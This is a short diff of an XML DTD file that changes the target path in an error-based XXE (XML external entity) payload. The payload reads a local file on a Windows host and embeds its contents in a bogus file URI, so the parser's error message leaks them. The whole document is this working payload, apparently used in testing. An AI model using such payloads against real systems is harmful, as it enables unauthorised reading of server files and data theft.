@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///d:/magtech/userfiels/x">
+<!ENTITY % file SYSTEM "file:///d:/magtech/magtest.txt">
 <!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///GG%file;'>">
 %eval;
 %err;
